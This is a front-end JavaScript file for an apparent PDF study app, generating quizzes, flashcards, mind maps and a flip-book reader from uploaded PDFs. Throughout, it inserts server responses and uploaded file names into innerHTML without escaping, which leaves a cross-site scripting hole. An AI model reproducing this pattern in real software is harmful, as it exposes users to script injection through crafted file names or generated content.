// ============================================
// QUIZ GENERATOR
// ============================================

let quizState = {
  questions: [],
  userAnswers: {},
  showAnswers: {},
  allAnswersShown: false
};

async function handleQuiz() {
  const num_questions = parseInt(document.getElementById('quiz-count').value);
  const resultBox = document.getElementById('quiz-result');
  const toolControls = resultBox.previousElementSibling;
  const button = toolControls.querySelector('.button-generate');
  
  // Hide description and change button text
  const description = toolControls.querySelector('.feature-description');
  if (description) {
    description.style.display = 'none';
  }
  
  // Change button text to Regenerate
  if (button) {
    button.innerHTML = '<i class="fas fa-redo"></i><span>Regenerate</span>';
  }
  
  // Remove centered class once generation starts
  if (toolControls && toolControls.classList) {
    toolControls.classList.remove('centered');
  }
  
  resultBox.innerHTML = `<div style="text-align: center; padding: 20px; color: var(--text-secondary);">
    <i class="fas fa-spinner fa-spin"></i> Generating ${num_questions} quiz questions...
  </div>`;

  // Check if PDF is loaded
  if (!appState.pdfText && !appState.pdfBase64) {
    if (appState.isProcessing) {
        resultBox.innerHTML = '<div style="color: var(--primary); padding: 20px;"><i class="fas fa-spinner fa-spin"></i> PDF is currently processing. Please wait...</div>';
        return;
    }
    resultBox.textContent = 'Error: No PDF uploaded';
    return;
  }

  try {
    const response = await fetch(`${API_BASE_URL}/api/quiz`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ count: num_questions, pdf_text: appState.pdfText }),
      credentials: 'include',
    });

    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Failed to generate quiz');
    
    if (data.quiz && Array.isArray(data.quiz)) {
      quizState.questions = data.quiz;
      quizState.userAnswers = {};
      quizState.showAnswers = {};
      quizState.allAnswersShown = false;
      renderInteractiveQuiz(resultBox);
      recordUsage('quiz', `Generated ${num_questions} questions`, appState.currentFileName);
    } else {
      resultBox.textContent = data.quiz_text || 'No quiz generated';
    }
  } catch (error) {
    resultBox.innerHTML = `<div style="color: var(--error); padding: 20px;">Error: ${error.message}</div>`;
  }
}

function renderInteractiveQuiz(container) {
  let html = '<div class="quiz-container">';
  
  html += '<div class="quiz-header">';
  html += `<h3>Quiz: ${quizState.questions.length} Questions</h3>`;
  html += '<div class="quiz-actions">';
  
  // Toggle Switch for Answers
  html += `
    <div class="quiz-toggle-wrapper">
      <span class="quiz-toggle-text">Show Answers</span>
      <label class="switch">
        <input type="checkbox" onchange="toggleAllAnswers()" ${quizState.allAnswersShown ? 'checked' : ''}>
        <span class="slider round"></span>
      </label>
    </div>
  `;
  
  html += '</div>';
  html += '</div>';
  
  quizState.questions.forEach((q, i) => {
    const isAnswered = quizState.userAnswers[i] !== undefined;
    const selectedAnswer = quizState.userAnswers[i];
    const isCorrect = selectedAnswer === q.correct_answer_index;
    const showAnswer = quizState.showAnswers[i];
    
    html += `<div class="quiz-question">`;
    html += `<div class="quiz-question-header">`;
    html += `<span class="quiz-q-number">Question ${i + 1}</span>`;
    if (isAnswered) {
      html += `<span class="quiz-status ${isCorrect ? 'correct' : 'incorrect'}">`;
      html += isCorrect ? '<i class="fas fa-check"></i> Correct' : '<i class="fas fa-times"></i> Incorrect';
      html += '</span>';
    }
    html += `</div>`;
    html += `<p class="quiz-question-text">${q.question}</p>`;
    
    html += `<div class="quiz-options">`;
    q.options.forEach((opt, j) => {
      const isSelected = selectedAnswer === j;
      const isCorrectOption = j === q.correct_answer_index;
      
      let optionClass = 'quiz-option';
      if (isAnswered) {
        if (isCorrectOption) optionClass += ' correct';
        if (isSelected && !isCorrect) optionClass += ' incorrect';
      }
      if (isSelected && !isAnswered) optionClass += ' selected';
      
      html += `<button class="${optionClass}" onclick="selectQuizAnswer(${i}, ${j})">`;
      html += `<span class="option-letter">${String.fromCharCode(65 + j)}</span>`;
      html += `<span class="option-text">${opt}</span>`;
      html += `</button>`;
    });
    html += `</div>`;
    
    // Show answer when showAllAnswers is activated (no individual toggle button)
    if (showAnswer) {
      html += `<div class="quiz-answer-section">`;
      html += `<div class="correct-answer">`;
      html += `<strong>✓ Correct Answer: ${q.options[q.correct_answer_index]}</strong>`;
      if (q.explanation) {
        html += `<p>${q.explanation}</p>`;
      }
      html += `</div>`;
      html += `</div>`;
    }
    
    html += `</div>`;
  });
  
  html += '</div>';
  container.innerHTML = html;
}

function selectQuizAnswer(questionIndex, answerIndex) {
  quizState.userAnswers[questionIndex] = answerIndex;
  // If all answers are shown, don't hide this one on selection
  if (!quizState.allAnswersShown) {
      quizState.showAnswers[questionIndex] = false;
  }
  const resultBox = document.getElementById('quiz-result');
  renderInteractiveQuiz(resultBox);
}

function toggleAnswerDisplay(questionIndex) {
  quizState.showAnswers[questionIndex] = !quizState.showAnswers[questionIndex];
  const resultBox = document.getElementById('quiz-result');
  renderInteractiveQuiz(resultBox);
}

function toggleAllAnswers() {
  quizState.allAnswersShown = !quizState.allAnswersShown;
  quizState.questions.forEach((q, i) => {
    quizState.showAnswers[i] = quizState.allAnswersShown;
  });
  const resultBox = document.getElementById('quiz-result');
  renderInteractiveQuiz(resultBox);
}

// ============================================
// FLASHCARDS
// ============================================

let flashcardState = {
  cards: [],
  currentCardIndex: 0,
  flipped: {}
};

async function handleFlashcards() {
  const num_cards = parseInt(document.getElementById('flashcards-count').value);
  const resultBox = document.getElementById('flashcards-result');
  const toolControls = resultBox.previousElementSibling;
  const button = toolControls.querySelector('.button-generate');
  
  // Hide description and change button text
  const description = toolControls.querySelector('.feature-description');
  if (description) {
    description.style.display = 'none';
  }
  
  // Change button text to Regenerate
  if (button) {
    button.innerHTML = '<i class="fas fa-redo"></i><span>Regenerate</span>';
  }
  
  // Remove centered class once generation starts
  if (toolControls && toolControls.classList) {
    toolControls.classList.remove('centered');
  }
  
  resultBox.innerHTML = `<div style="text-align: center; padding: 20px; color: var(--text-secondary);">
    <i class="fas fa-spinner fa-spin"></i> Generating ${num_cards} flashcards...
  </div>`;

  // Check if PDF is loaded
  if (!appState.pdfText && !appState.pdfBase64) {
    if (appState.isProcessing) {
        resultBox.innerHTML = '<div style="color: var(--primary); padding: 20px;"><i class="fas fa-spinner fa-spin"></i> PDF is currently processing. Please wait...</div>';
        return;
    }
    console.error('❌ No PDF text available. appState.pdfText:', appState.pdfText);
    console.error('appState.pdfBase64:', appState.pdfBase64);
    console.log('appState object:', appState);
    resultBox.textContent = 'Error: No PDF uploaded. Please upload a PDF first.';
    return;
  }

  console.log(`📊 Generating ${num_cards} flashcards from PDF of size ${appState.pdfText?.length || 0} characters`);

  try {
    const response = await fetch(`${API_BASE_URL}/api/flashcards`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ count: num_cards, pdf_text: appState.pdfText }),
      credentials: 'include',
    });

    console.log('Flashcard API Response Status:', response.status);
    const data = await response.json();
    console.log('Flashcard API Response Data:', data);
    
    if (!response.ok) {
      console.error('❌ API Error:', data.error);
      throw new Error(data.error || 'Failed to generate flashcards');
    }

    let flashcards = [];
    
    // Handle different response formats
    if (data.flashcards) {
      console.log('✅ Found flashcards in response');
      if (Array.isArray(data.flashcards)) {
        console.log('✅ Flashcards are already an array, count:', data.flashcards.length);
        flashcards = data.flashcards;
      } else if (typeof data.flashcards === 'string') {
        console.log('✅ Flashcards are a string, attempting to parse');
        try {
          flashcards = JSON.parse(data.flashcards);
          console.log('✅ Successfully parsed string, count:', flashcards.length);
        } catch (e) {
          console.error('❌ Failed to parse flashcards string:', e);
          resultBox.textContent = 'Error parsing flashcards - invalid format';
          return;
        }
      }
    } else if (data.flashcards_text) {
      console.log('⚠️ API returned flashcards_text instead:', data.flashcards_text);
      resultBox.innerHTML = `<div style="padding: 20px; text-align: left; color: var(--text-secondary); background: var(--surface); border: 1px solid var(--border); border-radius: 8px; white-space: pre-wrap; word-break: break-word; max-height: 400px; overflow-y: auto;">
        <strong>Generated Content (Raw):</strong>
        <br><br>
        ${data.flashcards_text}
      </div>`;
      return;
    } else {
      console.error('❌ No flashcards found in response');
      resultBox.textContent = 'No flashcards generated';
      return;
    }

    flashcardState.cards = flashcards;
    flashcardState.currentCardIndex = 0;
    flashcardState.flipped = {};
    renderFlashcards(resultBox);
    recordUsage('flashcards', `Generated ${num_cards} cards`, appState.currentFileName);
  } catch (error) {
    console.error('❌ Flashcard generation error:', error);
    resultBox.innerHTML = `<div style="color: var(--error); padding: 20px;">Error: ${error.message}</div>`;
  }
}

function renderFlashcards(container, direction = null) {
  if (flashcardState.cards.length === 0) {
    container.textContent = 'No flashcards available';
    return;
  }
  
  const card = flashcardState.cards[flashcardState.currentCardIndex];
  const isFlipped = flashcardState.flipped[flashcardState.currentCardIndex];
  const progress = ((flashcardState.currentCardIndex + 1) / flashcardState.cards.length) * 100;
  const variant = (flashcardState.currentCardIndex % 3) + 1;
  
  let animationClass = '';
  if (direction === 'next') animationClass = 'slide-next';
  if (direction === 'prev') animationClass = 'slide-prev';
  
  let html = `
    <div class="flashcard-container">
      <div class="flashcard ${isFlipped ? 'flipped' : ''} ${animationClass}" onclick="flipCard(${flashcardState.currentCardIndex})">
        
        <div class="flashcard__side flashcard__side--front">
          <div class="flashcard-header">
            <span>QUESTION</span>
          </div>
          <div class="flashcard-content-text">
            ${card.front || card.question}
          </div>
          <div class="flashcard-hint">Click to flip</div>
        </div>
        
        <div class="flashcard__side flashcard__side--back flashcard__side--back-${variant}">
          <div class="flashcard-header">
            <span>ANSWER</span>
          </div>
          <div class="flashcard-content-text">
            ${card.back || card.answer}
          </div>
        </div>

      </div>
      
      <div class="flashcard-controls">
        <button class="button-secondary" onclick="prevCard()" ${flashcardState.currentCardIndex === 0 ? 'disabled' : ''}>
          <i class="fas fa-chevron-left"></i>
        </button>
        
        <div class="flashcard-progress-container">
            <div class="flashcard-progress-bar" style="width: ${progress}%"></div>
        </div>
        
        <button class="button-secondary" onclick="nextCard()" ${flashcardState.currentCardIndex === flashcardState.cards.length - 1 ? 'disabled' : ''}>
          <i class="fas fa-chevron-right"></i>
        </button>
      </div>
      <div class="flashcard-counter">${flashcardState.currentCardIndex + 1} / ${flashcardState.cards.length}</div>
    </div>
  `;
  
  container.innerHTML = html;
}

function flipCard(index) {
  flashcardState.flipped[index] = !flashcardState.flipped[index];
  // Toggle class directly on the element to allow CSS transition to play
  const cardElement = document.querySelector('.flashcard');
  if (cardElement) {
    if (flashcardState.flipped[index]) {
      cardElement.classList.add('flipped');
    } else {
      cardElement.classList.remove('flipped');
    }
  }
}

function prevCard() {
  if (flashcardState.currentCardIndex > 0) {
    flashcardState.currentCardIndex--;
    const resultBox = document.getElementById('flashcards-result');
    renderFlashcards(resultBox, 'prev');
  }
}

function nextCard() {
  if (flashcardState.currentCardIndex < flashcardState.cards.length - 1) {
    flashcardState.currentCardIndex++;
    const resultBox = document.getElementById('flashcards-result');
    renderFlashcards(resultBox, 'next');
  }
}

// ============================================
// MIND MAP FEATURE
// ============================================

async function handleMindMap() {
  const resultBox = document.getElementById('mindmap-result');
  resultBox.innerHTML = '<div class="loading-spinner"><div class="spinner"></div><p>Generating mind map...</p></div>';
  
  try {
    const response = await fetch(`${API_BASE_URL}/api/generate-mindmap`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        text: appState.pdfText,
        filename: appState.currentFileName
      }),
      credentials: 'include'
    });
    
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Failed to generate mind map');
    
    // Render Mermaid
    resultBox.innerHTML = `<div class="mermaid-container"><div class="mermaid">${data.mermaid_code}</div></div>`;
    
    // Initialize Mermaid
    if (window.mermaid) {
        await mermaid.init(undefined, document.querySelectorAll('.mermaid'));
    } else {
        resultBox.innerHTML += '<div style="color:orange">Mermaid library not loaded. Please refresh.</div>';
    }
    
    recordUsage('mindmap', 'Generated mind map');
  } catch (error) {
    console.error('Mind map error:', error);
    resultBox.innerHTML = `<div class="error-message">Error: ${error.message}</div>`;
  }
}

// ============================================
// BOOK VIEW FEATURE
// ============================================

let bookFlipInstance = null;

function handleBookView() {
  // By default, show the library view
  document.getElementById('book-library-view').style.display = 'block';
  document.getElementById('book-reader-view').style.display = 'none';
  renderBookLibrary();
}

function renderBookLibrary() {
  const grid = document.getElementById('book-library-grid');
  if (!grid) return;
  
  grid.innerHTML = '';
  
  if (appState.pdfsList.length === 0) {
    grid.innerHTML = '<div style="grid-column: 1/-1; text-align:center; color:var(--text-secondary); padding: 40px;">No books in library. Upload a PDF to get started!</div>';
    return;
  }
  
  appState.pdfsList.forEach((pdf, index) => {
    const book = document.createElement('div');
    book.className = 'book-item';
    book.onclick = () => openBookInReader(index);
    
    // Generate a random color for cover
    const hue = (index * 137) % 360;
    const cleanName = pdf.name.replace(/\.pdf$/i, '');
    
    book.innerHTML = `
      <div class="book-cover" style="background: linear-gradient(45deg, hsl(${hue}, 70%, 50%), hsl(${hue}, 70%, 40%)); box-shadow: 5px 5px 15px rgba(0,0,0,0.2);">
        <div class="book-title" style="font-size: 1.2rem;">${cleanName}</div>
        <div class="book-author" style="margin-top: auto; font-size: 0.8rem; opacity: 0.8;">PDF Document</div>
      </div>
      <div class="book-item-title" style="margin-top: 10px; font-weight: 600; color: var(--text-primary);">${cleanName}</div>
      <div style="font-size: 0.8rem; color: var(--text-secondary);">PDF Document</div>
    `;
    grid.appendChild(book);
  });
}

async function openBookInReader(index) {
  // Set as current PDF
  appState.selectedPdfIndices = [index];
  
  // Switch views
  document.getElementById('book-library-view').style.display = 'none';
  document.getElementById('book-reader-view').style.display = 'flex';
  
  const container = document.getElementById('book-flip-container');
  const wrapper = document.getElementById('book-flip-wrapper');
  
  container.innerHTML = '<div class="loading-spinner"><div class="spinner"></div><p>Opening book...</p></div>';
  
  try {
    // Convert base64 to Uint8Array for PDF.js
    const pdfData = atob(appState.pdfBase64);
    const pdfArray = new Uint8Array(pdfData.length);
    for (let i = 0; i < pdfData.length; i++) {
      pdfArray[i] = pdfData.charCodeAt(i);
    }

    // Load PDF using PDF.js
    const loadingTask = pdfjsLib.getDocument({data: pdfArray});
    const pdf = await loadingTask.promise;
    
    container.innerHTML = ''; // Clear loading
    
    // Calculate dimensions based on wrapper
    const availWidth = wrapper.clientWidth || 800;
    const availHeight = wrapper.clientHeight || 600;
    
    // Target page size (half of book width)
    const targetPageWidth = Math.floor(availWidth * 0.45); 
    const targetPageHeight = Math.floor(availHeight * 0.9);
    
    const pageNodes = [];
    
    for (let i = 1; i <= pdf.numPages; i++) {
      const pageDiv = document.createElement('div');
      pageDiv.className = 'page';
      pageDiv.style.backgroundColor = 'white';
      pageDiv.style.display = 'flex';
      pageDiv.style.justifyContent = 'center';
      pageDiv.style.alignItems = 'center';
      pageDiv.style.overflow = 'hidden';
      
      // Get page to determine aspect ratio
      const page = await pdf.getPage(i);
      const viewport = page.getViewport({scale: 1.0});
      
      // Calculate scale to fit target dimensions
      const scaleX = targetPageWidth / viewport.width;
      const scaleY = targetPageHeight / viewport.height;
      const scale = Math.min(scaleX, scaleY);
      
      const scaledViewport = page.getViewport({scale: scale});
      
      // Create a wrapper for content to ensure alignment of canvas and text layer
      const contentWrapper = document.createElement('div');
      contentWrapper.style.position = 'relative';
      contentWrapper.style.width = `${scaledViewport.width}px`;
      contentWrapper.style.height = `${scaledViewport.height}px`;
      contentWrapper.style.backgroundColor = 'white';
      contentWrapper.style.boxShadow = '0 2px 5px rgba(0,0,0,0.1)';
      
      // High-DPI rendering
      const outputScale = Math.max(window.devicePixelRatio || 1, 2);
      
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      
      canvas.width = Math.floor(scaledViewport.width * outputScale);
      canvas.height = Math.floor(scaledViewport.height * outputScale);
      canvas.style.width = "100%";
      canvas.style.height = "100%";
      
      const transform = [outputScale, 0, 0, outputScale, 0, 0];
      
      const renderContext = {
        canvasContext: context,
        transform: transform,
        viewport: scaledViewport
      };
      
      // Render page
      await page.render(renderContext).promise;
      contentWrapper.appendChild(canvas);
      
      // Text Layer
      try {
          const textContent = await page.getTextContent();
          const textLayerDiv = document.createElement("div");
          textLayerDiv.className = "textLayer";
          
          // CRITICAL: Stop propagation of mouse/pointer events so PageFlip doesn't steal them
          // This allows text selection. Users should use buttons to flip or drag from margins (if any).
          const stopProp = (e) => { e.stopPropagation(); };
          textLayerDiv.addEventListener('mousedown', stopProp);
          textLayerDiv.addEventListener('touchstart', stopProp);
          textLayerDiv.addEventListener('pointerdown', stopProp);
          
          // Render text layer
          await pdfjsLib.renderTextLayer({
            textContent: textContent,
            container: textLayerDiv,
            viewport: scaledViewport,
            textDivs: []
          }).promise;
          
          contentWrapper.appendChild(textLayerDiv);
      } catch (err) {
          console.warn("Error rendering text layer:", err);
      }

      pageDiv.appendChild(contentWrapper);
      container.appendChild(pageDiv);
      pageNodes.push(pageDiv);
    }
    
    // Initialize PageFlip
    if (bookFlipInstance) {
      bookFlipInstance.destroy();
      bookFlipInstance = null;
    }
    
    if (typeof St === 'undefined' || !St.PageFlip) {
        console.error('PageFlip library not loaded');
        container.innerHTML = '<div style="color:var(--error); padding:20px;">Error: PageFlip library not loaded. Please refresh the page.</div>';
        return;
    }
    
    bookFlipInstance = new St.PageFlip(container, {
      width: targetPageWidth,
      height: targetPageHeight,
      size: 'fixed',
      minWidth: 300,
      maxWidth: 1000,
      minHeight: 400,
      maxHeight: 1200,
      maxShadowOpacity: 0.5,
      showCover: true,
      mobileScrollSupport: false,
      // Try to ensure interaction works
      useMouseEvents: true 
    });
    
    bookFlipInstance.loadFromHTML(pageNodes);
    
    bookFlipInstance.on('flip', (e) => {
      document.getElementById('book-page-info').textContent = `Page ${e.data + 1} of ${pdf.numPages}`;
    });
    
    document.getElementById('book-page-info').textContent = `Page 1 of ${pdf.numPages}`;
    
  } catch (e) {
    console.error('Error rendering book:', e);
    container.innerHTML = `<div style="color:var(--error); padding:20px;">Error loading book: ${e.message}</div>`;
  }
}

function closeBookReader() {
  document.getElementById('book-reader-view').style.display = 'none';
  document.getElementById('book-library-view').style.display = 'block';
  if (bookFlipInstance) {
    bookFlipInstance.destroy();
    bookFlipInstance = null;
  }
}

function bookFlipPrev() {
  if (bookFlipInstance) bookFlipInstance.flipPrev();
}

function bookFlipNext() {
  if (bookFlipInstance) bookFlipInstance.flipNext();
}

// ============================================
// LIBRARY
// ============================================

function openLibrary() {
  document.getElementById('library-modal').classList.add('active');
  renderBookshelf();
}

function closeLibrary() {
  document.getElementById('library-modal').classList.remove('active');
}

function renderBookshelf() {
  const shelf = document.getElementById('bookshelf');
  if (!shelf) return;
  
  shelf.innerHTML = '';
  
  if (appState.pdfsList.length === 0) {
    shelf.innerHTML = '<div style="grid-column: 1/-1; text-align:center; color:var(--text-secondary);">No books in library. Upload a PDF!</div>';
    return;
  }
  
  appState.pdfsList.forEach((pdf, index) => {
    const book = document.createElement('div');
    book.className = 'book-item';
    book.onclick = () => openBook(index);
    
    // Generate a random color for cover if we don't have one
    const hue = (index * 137) % 360;
    
    book.innerHTML = `
      <div class="book-cover" style="background: linear-gradient(45deg, hsl(${hue}, 70%, 50%), hsl(${hue}, 70%, 40%))">
        <div class="book-title">${pdf.name}</div>
        <div class="book-author">PDF Document</div>
      </div>
      <div class="book-item-title">${pdf.name}</div>
    `;
    shelf.appendChild(book);
  });
}

function openBook(index) {
  // Set as current PDF
  appState.selectedPdfIndices = [index];
  
  // Close library
  closeLibrary();
  
  // Switch to Book View tool
  // Find the book tool element
  const bookToolEl = document.querySelector('.tool-menu-item[onclick*="book"]');
  selectTool('book', bookToolEl);
}

// ============================================
// GLOBAL PROGRESS BAR
// ============================================

function updateGlobalProgressBar() {
  const container = document.getElementById('global-progress-container');
  const bar = document.getElementById('global-progress-bar');
  const text = document.getElementById('global-progress-text');
  
  if (!container || !bar || !text) return;
  
  const files = Object.keys(appState.processingFiles);
  if (files.length === 0) {
    container.style.display = 'none';
    return;
  }
  
  container.style.display = 'flex';
  
  // Calculate total progress
  let totalProgress = 0;
  files.forEach(f => {
    totalProgress += appState.processingFiles[f].progress;
  });
  const avgProgress = totalProgress / files.length;
  
  bar.style.width = `${avgProgress}%`;
  
  if (files.length === 1) {
    text.textContent = `Processing ${files[0]}...`;
  } else {
    text.textContent = `Processing ${files.length} files...`;
  }
}

function updateProcessingStatus(filename, progress, status) {
  if (!appState.processingFiles[filename]) {
    appState.processingFiles[filename] = { progress: 0, status: 'starting' };
  }
  
  if (progress !== null) appState.processingFiles[filename].progress = progress;
  if (status) appState.processingFiles[filename].status = status;
  
  updateGlobalProgressBar();
  updatePdfDropdown(); // Refresh dropdown to show status
}

function removeProcessingFile(filename) {
  delete appState.processingFiles[filename];
  updateGlobalProgressBar();
  updatePdfDropdown();
}
